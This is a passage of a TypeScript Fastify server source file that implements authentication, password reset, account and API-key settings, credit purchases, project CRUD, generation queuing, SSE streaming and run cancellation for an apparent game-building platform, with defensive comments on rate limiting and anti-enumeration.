    // Rate-limit registrations per IP to prevent bulk account creation.
    if (!checkAuthRateLimit(`register:${req.ip ?? 'unknown'}`)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: AUTH_WINDOW_MS });
    }

    // Check uniqueness
    const existing = await deps.authDb
      .select({ id: s.users.id })
      .from(s.users)
      .where(drizzleOr(drizzleEq(s.users.email, email), drizzleEq(s.users.handle, handle)))
      .catch(() => []);
    if (existing.length > 0) return reply.code(409).send({ error: 'email_or_handle_taken' });

    const passwordHash = await hashPassword(password);
    const token = generateSessionToken();

    // ATOMIC registration (#36): user + session + welcome-grant credits all commit
    // together. The old fire-and-forget grant could fail silently and strand a new
    // user with 0 credits (unable to generate anything). Now it's all-or-nothing.
    let user: { id: string; handle: string; displayName: string };
    try {
      user = await deps.authDb.transaction(async (tx) => {
        const [u] = await tx
          .insert(s.users)
          .values({ email, passwordHash, handle, displayName: displayName ?? handle })
          .returning({ id: s.users.id, handle: s.users.handle, displayName: s.users.displayName });
        if (!u) throw new Error('user insert returned no row');
        await tx.insert(s.sessions).values({ token, userId: u.id, expiresAt: sessionExpiresAt() });
        await tx
          .insert(s.creditLedger)
          .values({ userId: u.id, delta: FREE_TIER_CREDITS, reason: 'welcome_grant' });
        return u;
      });
    } catch (err) {
      console.error('[register] atomic registration failed:', err);
      return reply.code(500).send({ error: 'registration_failed' });
    }

    return reply
      .code(201)
      .send({ token, user: { id: user.id, handle: user.handle, displayName: user.displayName } });
  });

  app.post('/v1/auth/login', async (req, reply) => {
    if (!deps.authDb) return reply.code(503).send({ error: 'auth_unavailable' });
    const { schema: s } = await import('@playforge/db');
    const body = (req.body ?? {}) as { email?: unknown; password?: unknown };
    const email = typeof body.email === 'string' ? body.email.trim().toLowerCase() : null;
    const password = typeof body.password === 'string' ? body.password : null;
    if (!email || !password) return reply.code(400).send({ error: 'email_and_password_required' });

    // Rate-limit login attempts keyed on email+IP, NOT email alone (#15). Keying
    // solely on email let an attacker lock a victim out of their own account by
    // burning the victim's attempt budget from any IP. email+IP throttles a given
    // client without affecting the legitimate user on their own IP. (Per-IP
    // credential-stuffing caps + Redis-backed multi-instance state are follow-ups.)
    const ip = req.ip ?? 'unknown';
    if (!checkAuthRateLimit(`login:${email}:${ip}`)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: AUTH_WINDOW_MS });
    }

    const [user] = await deps.authDb
      .select({
        id: s.users.id,
        handle: s.users.handle,
        displayName: s.users.displayName,
        passwordHash: s.users.passwordHash,
      })
      .from(s.users)
      .where(drizzleEq(s.users.email, email));

    const ok = user ? await verifyPassword(password, user.passwordHash) : false;
    if (!user || !ok) {
      if (!user) await hashPassword(password).catch(() => {});
      return reply.code(401).send({ error: 'invalid_credentials' });
    }

    const token = generateSessionToken();
    await deps.authDb
      .insert(s.sessions)
      .values({ token, userId: user.id, expiresAt: sessionExpiresAt() });

    clearAuthRateLimit(`login:${email}:${ip}`);

    return reply.send({
      token,
      user: { id: user.id, handle: user.handle, displayName: user.displayName },
    });
  });

  app.post('/v1/auth/logout', async (req, reply) => {
    if (!deps.authDb) return reply.code(503).send({ error: 'auth_unavailable' });
    const { schema: s } = await import('@playforge/db');
    const authHeader = req.headers['authorization'];
    const raw = Array.isArray(authHeader) ? authHeader[0] : authHeader;
    const token = raw?.startsWith('Bearer ') ? raw.slice(7).trim() : null;
    if (token) {
      await deps.authDb
        .delete(s.sessions)
        .where(drizzleEq(s.sessions.token, token))
        .catch(() => {});
    }
    return reply.send({ ok: true });
  });

  app.get('/v1/auth/me', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const balance = await getUserBalance(user.userId);
    const settings = deps.accountRepo ? await deps.accountRepo.getSettings(user.userId) : null;
    return reply.send({
      userId: user.userId,
      handle: user.handle,
      ...(settings
        ? {
            onboardingComplete: settings.onboardingCompletedAt !== null,
            defaultProvider: settings.defaultProvider,
          }
        : {}),
      ...(balance !== Number.POSITIVE_INFINITY ? { balance } : {}),
    });
  });

  // ── account settings ──────────────────────────────────────────────────────
  // GET    /v1/account/settings
  // PATCH  /v1/account/profile
  // PUT    /v1/account/provider
  // DELETE /v1/account/provider/:provider

  app.get('/v1/account/settings', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    if (!deps.accountRepo) return reply.code(503).send({ error: 'account_unavailable' });
    const settings = await deps.accountRepo.getSettings(user.userId);
    if (!settings) return reply.code(404).send({ error: 'not_found' });
    return reply.send(accountSettingsResponse(settings));
  });

  app.patch('/v1/account/profile', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    if (!deps.accountRepo) return reply.code(503).send({ error: 'account_unavailable' });
    const body = (req.body ?? {}) as {
      displayName?: unknown;
      bio?: unknown;
      avatarUrl?: unknown;
    };

    const patch: {
      displayName?: string;
      bio?: string | null;
      avatarUrl?: string | null;
    } = {};
    if (body.displayName !== undefined) {
      if (typeof body.displayName !== 'string') {
        return reply.code(400).send({ error: 'invalid_display_name' });
      }
      const displayName = body.displayName.trim();
      if (displayName.length < 1 || displayName.length > 80) {
        return reply.code(400).send({ error: 'invalid_display_name', max: 80 });
      }
      patch.displayName = displayName;
    }
    if (body.bio !== undefined) {
      if (typeof body.bio !== 'string') return reply.code(400).send({ error: 'invalid_bio' });
      const bio = body.bio.trim();
      if (bio.length > 280) return reply.code(400).send({ error: 'bio_too_long', max: 280 });
      patch.bio = bio.length > 0 ? bio : null;
    }
    if (body.avatarUrl !== undefined) {
      if (typeof body.avatarUrl !== 'string') {
        return reply.code(400).send({ error: 'invalid_avatar_url' });
      }
      const avatarUrl = body.avatarUrl.trim();
      if (avatarUrl.length === 0) {
        patch.avatarUrl = null;
      } else {
        try {
          const parsed = new URL(avatarUrl);
          if (parsed.protocol !== 'https:') throw new Error('https_required');
          patch.avatarUrl = parsed.toString();
        } catch {
          return reply.code(400).send({ error: 'invalid_avatar_url' });
        }
      }
    }

    const settings = await deps.accountRepo.updateProfile(user.userId, patch);
    if (!settings) return reply.code(404).send({ error: 'not_found' });
    return reply.send(accountSettingsResponse(settings));
  });

  app.put('/v1/account/provider', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    if (!deps.accountRepo) return reply.code(503).send({ error: 'account_unavailable' });
    const body = (req.body ?? {}) as {
      provider?: unknown;
      modelId?: unknown;
      apiKey?: unknown;
      completeOnboarding?: unknown;
    };
    const provider = typeof body.provider === 'string' ? body.provider.trim() : '';
    if (!isAccountProvider(provider)) {
      return reply.code(400).send({ error: 'invalid_provider' });
    }

    const modelId =
      typeof body.modelId === 'string' && body.modelId.trim().length > 0
        ? body.modelId.trim()
        : defaultModelForProvider(provider);
    const markOnboardingComplete = body.completeOnboarding !== false;

    if (isByokProvider(provider)) {
      const apiKey = typeof body.apiKey === 'string' ? body.apiKey.trim() : '';
      if (apiKey.length > 0) {
        const shapeError = apiKeyShapeError(provider, apiKey);
        if (shapeError) return reply.code(400).send({ error: shapeError });
        if (!deps.apiKeyEncryptionSecret) {
          return reply.code(503).send({ error: 'api_key_encryption_unavailable' });
        }
        await deps.accountRepo.saveApiKey(user.userId, {
          provider,
          ciphertext: encryptApiKey(apiKey, deps.apiKeyEncryptionSecret),
          last4: last4OfApiKey(apiKey),
        });
      } else {
        const current = await deps.accountRepo.getSettings(user.userId);
        const hasExisting = current?.keys.some((key) => key.provider === provider) ?? false;
        if (!hasExisting) {
          return reply.code(400).send({ error: 'api_key_required', provider });
        }
      }
    }

    const settings = await deps.accountRepo.saveProvider(user.userId, {
      provider,
      modelId: provider === 'platform' ? null : modelId,
      markOnboardingComplete,
    });
    if (!settings) return reply.code(404).send({ error: 'not_found' });
    return reply.send(accountSettingsResponse(settings));
  });

  app.delete('/v1/account/provider/:provider', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    if (!deps.accountRepo) return reply.code(503).send({ error: 'account_unavailable' });
    const { provider } = req.params as { provider: string };
    if (!isByokProvider(provider)) return reply.code(400).send({ error: 'invalid_provider' });

    const before = await deps.accountRepo.getSettings(user.userId);
    await deps.accountRepo.deleteApiKey(user.userId, provider);
    const settings =
      before?.defaultProvider === provider
        ? await deps.accountRepo.saveProvider(user.userId, {
            provider: 'platform',
            modelId: null,
            markOnboardingComplete: false,
          })
        : await deps.accountRepo.getSettings(user.userId);
    if (!settings) return reply.code(404).send({ error: 'not_found' });
    return reply.send(accountSettingsResponse(settings));
  });

  // ── password reset (6.2) ────────────────────────────────────────────────────
  // POST /v1/auth/forgot-password {email} — ALWAYS 202 (no account enumeration).
  //   If the email maps to a live account, mint a single-use, short-TTL token,
  //   store its HASH, and "send" the raw token via the EmailPort. Rate-limited.
  // POST /v1/auth/reset-password {token, newPassword} — validate the token
  //   (unexpired + unused), set the new password, mark the token used, and DELETE
  //   ALL the user's sessions so a thief's stolen session can't survive a reset.

  app.post('/v1/auth/forgot-password', async (req, reply) => {
    // Gated on BOTH a DB and an email transport — without a way to send the
    // token the flow is inert. 503 makes the missing wiring explicit.
    if (!deps.authDb || !deps.email) return reply.code(503).send({ error: 'reset_unavailable' });
    const { schema: s } = await import('@playforge/db');
    const body = (req.body ?? {}) as { email?: unknown };
    const email = typeof body.email === 'string' ? body.email.trim().toLowerCase() : null;

    // Rate-limit per IP so the endpoint can't be used to spray reset mail or
    // probe which emails exist (timing). Keyed before the lookup.
    if (!checkAuthRateLimit(`forgot:${req.ip ?? 'unknown'}`)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: AUTH_WINDOW_MS });
    }

    // Anti-enumeration: ALWAYS reply 202, whether or not the account exists. The
    // mint + send only happens for a real, live account. A malformed email is
    // also accepted silently (same 202) so the response can't be used to probe.
    const accepted = reply.code(202).send({ ok: true });
    if (!email || !email.includes('@') || email.length > 320) return accepted;

    const [user] = await deps.authDb
      .select({ id: s.users.id })
      .from(s.users)
      .where(drizzleAnd(drizzleEq(s.users.email, email), drizzleIsNull(s.users.deletedAt)))
      .catch(() => []);
    if (!user) return accepted;

    const rawToken = randomBytes(32).toString('base64url');
    const tokenHash = hashResetToken(rawToken);
    const expiresAt = new Date(Date.now() + PASSWORD_RESET_TTL_MS);
    try {
      await deps.authDb
        .insert(s.passwordResetTokens)
        .values({ userId: user.id, tokenHash, expiresAt });
      await deps.email.send(
        buildPasswordResetEmail({
          to: email,
          token: rawToken,
          ...(deps.appBaseUrl !== undefined ? { appBaseUrl: deps.appBaseUrl } : {}),
          ttlMinutes: Math.round(PASSWORD_RESET_TTL_MS / 60_000),
        }),
      );
    } catch (err) {
      // Never leak failure to the caller (still 202); log for operators.
      console.error('[forgot-password] mint/send failed:', err);
    }
    return accepted;
  });

  app.post('/v1/auth/reset-password', async (req, reply) => {
    if (!deps.authDb) return reply.code(503).send({ error: 'reset_unavailable' });
    const { schema: s } = await import('@playforge/db');
    const body = (req.body ?? {}) as { token?: unknown; newPassword?: unknown };
    const token = typeof body.token === 'string' ? body.token : null;
    const newPassword = typeof body.newPassword === 'string' ? body.newPassword : null;
    if (!token) return reply.code(400).send({ error: 'token_required' });
    if (!newPassword || newPassword.length < PASSWORD_MIN_LEN) {
      return reply.code(400).send({ error: 'password_too_short', min: PASSWORD_MIN_LEN });
    }
    if (newPassword.length > PASSWORD_MAX_LEN) {
      return reply.code(400).send({ error: 'password_too_long', max: PASSWORD_MAX_LEN });
    }
    // Rate-limit reset attempts per IP so a stolen-token guess loop is bounded.
    if (!checkAuthRateLimit(`reset:${req.ip ?? 'unknown'}`)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: AUTH_WINDOW_MS });
    }

    const tokenHash = hashResetToken(token);
    const [row] = await deps.authDb
      .select({ id: s.passwordResetTokens.id, userId: s.passwordResetTokens.userId })
      .from(s.passwordResetTokens)
      .where(
        drizzleAnd(
          drizzleEq(s.passwordResetTokens.tokenHash, tokenHash),
          drizzleIsNull(s.passwordResetTokens.usedAt),
          drizzleSql`${s.passwordResetTokens.expiresAt} > now()`,
        ),
      );
    if (!row) return reply.code(400).send({ error: 'invalid_or_expired_token' });

    const passwordHash = await hashPassword(newPassword);
    // Atomic: set the new password, burn the token, kill every session. A reset
    // is a security event — force re-login everywhere so a stolen live session
    // (or a session on the attacker's device) is invalidated.
    try {
      await deps.authDb.transaction(async (tx) => {
        // Burn the token first, guarded on still-unused, so a racing double-submit
        // can only succeed once (the UPDATE … WHERE used_at IS NULL is the gate).
        const used = await tx
          .update(s.passwordResetTokens)
          .set({ usedAt: new Date() })
          .where(
            drizzleAnd(
              drizzleEq(s.passwordResetTokens.id, row.id),
              drizzleIsNull(s.passwordResetTokens.usedAt),
            ),
          )
          .returning({ id: s.passwordResetTokens.id });
        if (used.length === 0) throw new ResetTokenRaceError();
        await tx.update(s.users).set({ passwordHash }).where(drizzleEq(s.users.id, row.userId));
        await tx.delete(s.sessions).where(drizzleEq(s.sessions.userId, row.userId));
      });
    } catch (err) {
      if (err instanceof ResetTokenRaceError) {
        return reply.code(400).send({ error: 'invalid_or_expired_token' });
      }
      console.error('[reset-password] reset transaction failed:', err);
      return reply.code(500).send({ error: 'reset_failed' });
    }
    return reply.send({ ok: true });
  });

  // ── credit purchase (6.1) ────────────────────────────────────────────────────
  // GET  /v1/credits/balance        — SUM(delta) balance (same as /auth/me).
  // POST /v1/credits/purchase {pack} — buy a credit pack via the provider; the
  //   webhook-style confirmation grants pack.credits to the ledger, idempotent on
  //   the provider's external event id (reuses credit_ledger_user_event_key).

  app.get('/v1/credits/balance', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const balance = await getUserBalance(user.userId);
    return reply.send({ balance: balance === Number.POSITIVE_INFINITY ? null : balance });
  });

  app.post('/v1/credits/purchase', async (req, reply) => {
    if (!deps.creditProvider || !deps.authDb) {
      return reply.code(503).send({ error: 'purchase_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { schema: s } = await import('@playforge/db');
    const body = (req.body ?? {}) as { pack?: unknown; packId?: unknown };
    const packId =
      typeof body.pack === 'string'
        ? body.pack
        : typeof body.packId === 'string'
          ? body.packId
          : null;
    if (!packId) return reply.code(400).send({ error: 'pack_required' });

    const confirmation = await deps.creditProvider.createPurchase({ userId: user.userId, packId });
    if (!confirmation) return reply.code(400).send({ error: 'unknown_pack', pack: packId });

    // Grant on confirmation. Idempotent on the external event id via the partial
    // unique credit_ledger_user_event_key (user_id, stripe_event_id) — the
    // stripe_event_id column is repurposed as the generic external event id, so a
    // double-fired webhook (or a client retry) grants the credits exactly once.
    if (confirmation.confirmed) {
      try {
        await deps.authDb
          .insert(s.creditLedger)
          .values({
            userId: user.userId,
            delta: confirmation.pack.credits,
            reason: 'purchase',
            stripeEventId: confirmation.externalEventId,
          })
          .onConflictDoNothing();
      } catch (err) {
        console.error('[purchase] credit grant failed:', err);
        return reply.code(500).send({ error: 'grant_failed' });
      }
    }

    const balance = await getUserBalance(user.userId);
    return reply.send({
      ok: true,
      pack: {
        id: confirmation.pack.id,
        credits: confirmation.pack.credits,
        priceUsd: confirmation.pack.priceUsd,
      },
      eventId: confirmation.externalEventId,
      checkoutUrl: confirmation.checkoutUrl,
      confirmed: confirmation.confirmed,
      ...(balance !== Number.POSITIVE_INFINITY ? { balance } : {}),
    });
  });

  // ── projects CRUD ─────────────────────────────────────────────────────────

  app.post('/v1/projects', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const body = (req.body ?? {}) as {
      name?: unknown;
      engine?: unknown;
      visibility?: unknown;
      remixOfProjectId?: unknown;
    };
    if (body.engine !== undefined && !ENGINES.includes(body.engine as Engine)) {
      return reply.code(400).send({ error: 'invalid_engine', allowed: ENGINES });
    }
    if (body.visibility !== undefined && !VISIBILITIES.includes(body.visibility as Visibility)) {
      return reply.code(400).send({ error: 'invalid_visibility', allowed: VISIBILITIES });
    }
    // The project name becomes the published title rendered into <head>/OG tags
    // and every Hub/profile card. Cap it so it can't bloat feeds or fill an OG
    // payload with megabytes of attacker-chosen text. (content MEDIUM)
    if (typeof body.name === 'string' && body.name.length > MAX_PROJECT_NAME_LEN) {
      return reply.code(400).send({ error: 'name_too_long', max: MAX_PROJECT_NAME_LEN });
    }
    // Validate any claimed remix lineage rather than storing it verbatim — an
    // unvalidated remixOfProjectId lets a user forge "Remix of <popular game>"
    // attribution. Must reference an existing, non-private project. (auth M3)
    if (typeof body.remixOfProjectId === 'string') {
      const parent = await deps.repo.get(body.remixOfProjectId);
      if (!parent || (parent.ownerId !== user.userId && parent.visibility === 'private')) {
        return reply.code(400).send({ error: 'invalid_remix_parent' });
      }
    }
    const project = await deps.repo.create({
      ownerId: user.userId,
      ...(typeof body.name === 'string' ? { name: body.name } : {}),
      ...(body.engine !== undefined ? { engine: body.engine as Engine } : {}),
      ...(body.visibility !== undefined ? { visibility: body.visibility as Visibility } : {}),
      ...(typeof body.remixOfProjectId === 'string'
        ? { remixOfProjectId: body.remixOfProjectId }
        : {}),
    });
    return reply.code(201).send(project);
  });

  app.get('/v1/projects', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    return reply.send({ projects: await deps.repo.listByOwner(user.userId) });
  });

  app.get('/v1/projects/:id', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project) return reply.code(404).send({ error: 'not_found' });
    if (project.ownerId !== user.userId && project.visibility === 'private') {
      return reply.code(404).send({ error: 'not_found' });
    }
    return reply.send(project);
  });

  app.patch('/v1/projects/:id', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const body = (req.body ?? {}) as { name?: unknown };
    if (typeof body.name !== 'string' || body.name.trim() === '') {
      return reply.code(400).send({ error: 'name_required' });
    }
    if (body.name.length > MAX_PROJECT_NAME_LEN) {
      return reply.code(400).send({ error: 'name_too_long', max: MAX_PROJECT_NAME_LEN });
    }
    const updated = await deps.repo.rename(id, user.userId, body.name);
    if (!updated) return reply.code(404).send({ error: 'not_found' });
    return reply.send(updated);
  });

  app.delete('/v1/projects/:id', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const ok = await deps.repo.softDelete(id, user.userId);
    if (!ok) return reply.code(404).send({ error: 'not_found' });
    return reply.code(204).send();
  });

  // ── generation enqueue ────────────────────────────────────────────────────

  app.post('/v1/projects/:id/generate', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const body = (req.body ?? {}) as { prompt?: unknown };
    if (typeof body.prompt !== 'string' || body.prompt.trim() === '') {
      return reply.code(400).send({ error: 'prompt_required' });
    }
    if (body.prompt.length > 8000) {
      return reply.code(400).send({ error: 'prompt_too_long', max: 8000 });
    }
    // Concurrent run cap — reject if the user already has too many active runs.
    if (deps.maxConcurrentRunsPerUser !== undefined) {
      const active = await deps.runRepo.countActiveByUser(user.userId);
      if (active >= deps.maxConcurrentRunsPerUser) {
        return reply
          .code(429)
          .send({ error: 'concurrent_run_limit', active, limit: deps.maxConcurrentRunsPerUser });
      }
    }

    const generationCredentials = await resolveGenerationCredentials(user.userId);
    if (!generationCredentials.ok) {
      return reply.code(generationCredentials.status).send(generationCredentials.body);
    }

    const run = await deps.runRepo.create({ projectId: project.id, userId: user.userId });

    // Atomic credit RESERVATION (replaces the old non-atomic balance pre-check).
    // A per-user Postgres advisory lock serializes concurrent generate calls so
    // two runs can't both read an affordable balance and overspend. We insert a
    // negative 'reservation' row keyed on run.id (idempotent via the partial
    // unique 'credit_ledger_reservation_key'), so the cost is committed up front.
    // On success the worker does NOT debit again; on failure it refunds the row.
    if (deps.authDb) {
      try {
        const { schema: s } = await import('@playforge/db');
        await deps.authDb.transaction(async (tx) => {
          await tx.execute(drizzleSql`SELECT pg_advisory_xact_lock(hashtext(${user.userId}))`);
          const [row] = await tx
            .select({ bal: drizzleSql<number>`COALESCE(SUM(${s.creditLedger.delta}), 0)` })
            .from(s.creditLedger)
            .where(drizzleEq(s.creditLedger.userId, user.userId));
          const balance = Number(row?.bal ?? 0);
          if (!decideAffordability(balance).ok) {
            throw new InsufficientCreditsError(balance, CREDITS_PER_RUN);
          }
          await tx
            .insert(s.creditLedger)
            .values({
              userId: user.userId,
              delta: -CREDITS_PER_RUN,
              reason: 'reservation',
              runId: run.id,
            })
            .onConflictDoNothing();
        });
      } catch (err) {
        // Insufficient balance → mark the just-created run failed so it isn't
        // left dangling as 'queued', and reply 402. Any other error is a real
        // failure: also fail the run and surface a 500.
        await deps.runRepo.updateStatus(run.id, 'failed').catch(() => {});
        if (err instanceof InsufficientCreditsError) {
          return reply
            .code(402)
            .send({ error: 'insufficient_credits', balance: err.balance, required: err.required });
        }
        console.error(`[generate] credit reservation failed for run ${run.id}:`, err);
        return reply.code(500).send({ error: 'reservation_failed' });
      }
    }

    // Persist the user's prompt to chat history so it survives page reloads.
    if (deps.chatRepo) {
      void deps.chatRepo.add(project.id, 'user', { text: body.prompt.trim(), runId: run.id });
    }

    // Check for a paused continuation from a previous run on this project.
    const paused = await deps.runRepo.getPausedContinuation(project.id);

    // Fire-and-forget — the worker publishes events; the browser streams via SSE.
    void deps.enqueue({
      runId: run.id,
      projectId: project.id,
      userId: user.userId,
      prompt: body.prompt.trim(),
      ...(generationCredentials.model !== undefined ? { model: generationCredentials.model } : {}),
      ...(generationCredentials.apiKey !== undefined
        ? { apiKey: generationCredentials.apiKey }
        : {}),
      ...(paused?.snapshotManifestKey !== null && paused?.snapshotManifestKey !== undefined
        ? { parentManifestKey: paused.snapshotManifestKey }
        : project.currentManifestKey !== null
          ? { parentManifestKey: project.currentManifestKey }
          : {}),
      ...(paused !== null ? { continuation: paused.continuation } : {}),
      ...(deps.maxRunTokens !== undefined ? { maxTokens: deps.maxRunTokens } : {}),
      // Prompt-injection guard: flag remix projects so the worker prepends the
      // untrusted-content safety header before passing the prompt to the agent.
      ...(project.remixOfProjectId !== null ? { isRemix: true } : {}),
    });
    return reply.code(202).send({ runId: run.id });
  });

  // ── SSE event relay ───────────────────────────────────────────────────────

  app.get('/v1/runs/:id/stream', async (req, reply) => {
    // EventSource can't set headers → allow the ?token= query fallback here.
    const user = await requireUser(req, reply, { allowQueryToken: true });
    if (!user) return;
    const { id } = req.params as { id: string };
    const run: Run | null = await deps.runRepo.get(id);
    if (!run || run.userId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }

    // Hand off to raw Node response; Fastify must not touch it after this.
    reply.hijack();
    applyCorsHeaders(req, (name, value) => reply.raw.setHeader(name, value));
    reply.raw.setHeader('Content-Type', 'text/event-stream');
    reply.raw.setHeader('Cache-Control', 'no-cache');
    reply.raw.setHeader('Connection', 'keep-alive');
    reply.raw.flushHeaders();

    let done = false;

    await new Promise<void>((resolve) => {
      // ── SSE keep-alive + hard cap (4.2) ────────────────────────────────────
      // Idle proxies (CDNs, load balancers, NAT middleboxes) drop a connection
      // that's been silent for ~30–60s. A long agent build can be silent between
      // events, so attachSseHeartbeat writes a `: ping` comment frame every
      // SSE_HEARTBEAT_MS to keep the pipe warm (comment frames are ignored by
      // EventSource), and a hard SSE_MAX_STREAM_MS cap closes any stream that runs
      // absurdly long so the connection + its bus subscription can't leak forever.
      // stopHeartbeat() clears BOTH timers; finish() calls it on every close path.
      // Must be `let`: finish() (defined below) captures it before its single assignment.
      // biome-ignore lint/style/useConst: deferred assignment after the capturing closure.
      let stopHeartbeat: (() => void) | undefined;
      // Captured from bus.subscribe() below. MUST be called on every close path
      // or the RedisEventBus reader (a dedicated blocking-XREAD connection per
      // subscription) leaks forever — one stranded Redis connection per ended
      // stream, climbing until Redis refuses connections. (correctness C1)
      let unsubscribe: (() => void) | undefined;

      const finish = () => {
        if (done) return;
        done = true;
        stopHeartbeat?.();
        unsubscribe?.();
        reply.raw.end();
        resolve();
      };

      stopHeartbeat = attachSseHeartbeat(
        (chunk) => {
          if (!done) reply.raw.write(chunk);
        },
        finish,
        {
          ...(deps.sseHeartbeatMs !== undefined ? { heartbeatMs: deps.sseHeartbeatMs } : {}),
          ...(deps.sseMaxStreamMs !== undefined ? { maxMs: deps.sseMaxStreamMs } : {}),
        },
      );

      // `req.raw` is the underlying Node IncomingMessage.
      req.raw.on('close', finish);

      // Subscribe with replay: InMemoryEventBus calls the handler synchronously
      // for all history before resolving, so inject() tests complete without
      // needing to await a separate enqueue step.
      deps.bus
        .subscribe(runChannel(id), (message) => {
          if (done) return;
          const m = message as { type?: string };
          const previewUrl = `/v1/runs/${id}/preview/`;
          // Attach the preview URL to run_complete so the browser knows where to load the game.
          const payload = m.type === 'run_complete' ? { ...m, previewUrl } : message;
          // An unserializable bus event (circular ref, BigInt, throwing getter)
          // must not throw out of this handler — that would strand the stream with
          // its timers armed and (pre-C1) its subscription leaked. Skip the bad
          // frame instead. (correctness H3)
          try {
            reply.raw.write(`data: ${JSON.stringify(payload)}\n\n`);
          } catch (err) {
            console.error(
              `[sse] dropping unserializable event on run ${id}:`,
              err instanceof Error ? err.message : err,
            );
          }
          if (m.type === 'run_complete') {
            // Push a preview_updated notification to all presence sockets for this project
            // so other collaborators' previews auto-reload without polling.
            void deps.runRepo
              .get(id)
              .then((r) => {
                if (!r) return;
                const msg = JSON.stringify({
                  type: 'preview_updated',
                  projectId: r.projectId,
                  previewUrl,
                });
                for (const fn of presenceSockets.get(r.projectId) ?? []) fn(msg);
              })
              .catch((err) => {
                console.error(
                  `[sse] preview_updated broadcast failed for run ${id}:`,
                  err instanceof Error ? err.message : err,
                );
              });
            finish();
          }
          if (m.type === 'run_error') {
            finish();
          }
          // A paused or canceled run is terminal for THIS stream: the worker won't
          // emit further events on this run channel. Without finishing here a
          // `run_paused` (worker pause) or `run_canceled` (cancel endpoint) frame
          // would be written but the stream would hang open until the client/HTTP
          // timeout. The frontend keys its Resume button on the {type:'run_paused'}
          // frame, so the shape must stay exactly that.
          if (m.type === 'run_paused' || m.type === 'run_canceled') {
            finish();
          }
        })
        .then((unsub) => {
          // If the handler already drove the stream to completion during the
          // synchronous in-memory replay, `done` is set before we get here —
          // unsubscribe immediately so nothing leaks. Otherwise hand the
          // unsubscribe to finish().
          if (done) unsub();
          else unsubscribe = unsub;
        })
        .catch((err) => {
          // subscribe() rejected (e.g. Redis unavailable / replay failure):
          // close the stream rather than leave it hanging open.
          console.error(
            `[sse] bus.subscribe failed for run ${id}:`,
            err instanceof Error ? err.message : err,
          );
          finish();
        });
    });
  });

  // ── run cancellation ──────────────────────────────────────────────────────
  // POST /v1/runs/:id/cancel  (auth + run-ownership)
  //
  // Phase 2.7, WAITING-JOB-FIRST: cancels a run whose BullMQ job is still
  // queued/waiting. Active-job cancel (interrupting a running agent via a
  // checkpoint hint) is an explicit follow-up and returns 409 here.
  //
  //   - terminal run (completed/failed/canceled) → 200 no-op
  //   - waiting/queued run → remove the job (jobId === runId), set status
  //     'canceled', publish {type:'run_canceled'} (closes the SSE stream via
  //     finish()), and REFUND the reservation exactly once (idempotent insert,
  //     reason 'refund', keyed on runId by 'credit_ledger_refund_key').
  //   - running run → 409 (active-job cancel not supported yet).
  //
  // Guarded behind deps.generateQueue: no-Redis dev has no job to remove, so it
  // returns 503 (matching how queue-dependent routes guard).

  app.post('/v1/runs/:id/cancel', async (req, reply) => {
    if (!deps.generateQueue) {
      return reply.code(503).send({ error: 'cancel_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const run = await deps.runRepo.get(id);
    if (!run || run.userId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }

    // Already terminal → idempotent no-op.
    if (run.status === 'completed' || run.status === 'failed' || run.status === 'canceled') {
      return reply.code(200).send({ status: run.status, canceled: run.status === 'canceled' });
    }

    // Inspect the live job state. The job is enqueued with jobId === runId, so a
    // direct getJob(runId) finds it. A 'running' run, or a job already pulled
    // into 'active', can't be safely torn down yet → 409 follow-up.
    const job = await deps.generateQueue.getJob(id);
    if (run.status === 'running') {
      return reply.code(409).send({
        error: 'active_run_cancel_unsupported',
        message: 'This run is already executing; active-run cancellation is not supported yet.',
      });
    }
    if (job) {
      const state = await job.getState();
      if (state === 'active') {
        return reply.code(409).send({
          error: 'active_run_cancel_unsupported',
          message: 'This run is already executing; active-run cancellation is not supported yet.',
        });
      }
      // Remove the waiting/queued/delayed job so the worker never picks it up.
      await job.remove();
    }

    // Persist the canceled status, then notify any open SSE stream so it closes.
    await deps.runRepo.updateStatus(id, 'canceled');
    await deps.bus.publish(runChannel(id), { type: 'run_canceled' });

    // Refund the enqueue-time reservation exactly once. Mirrors the worker
    // 'failed' refund: insert delta +CREDITS_PER_RUN, reason 'refund', keyed on
    // runId. The partial unique 'credit_ledger_refund_key' makes a re-cancel (or
    // a later 'failed' handler) a no-op via onConflictDoNothing.
    if (deps.authDb) {
      const { schema: s } = await import('@playforge/db');
      await deps.authDb
        .insert(s.creditLedger)
        .values({ userId: run.userId, delta: CREDITS_PER_RUN, reason: 'refund', runId: id })
        .onConflictDoNothing()
        .catch((refundErr: unknown) => {
          console.error(`[cancel] credit refund failed for run ${id}:`, refundErr);
        });
    }

    return reply.code(200).send({ status: 'canceled', canceled: true });
  });

  // ── chat history ──────────────────────────────────────────────────────────

  app.get('/v1/projects/:id/chat', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    // Chat history is the build conversation — it contains every prompt the
    // owner typed, which can be private. Only the owner may read it, regardless
    // of the *game's* visibility (playing a published game uses /v1/play/:slug,
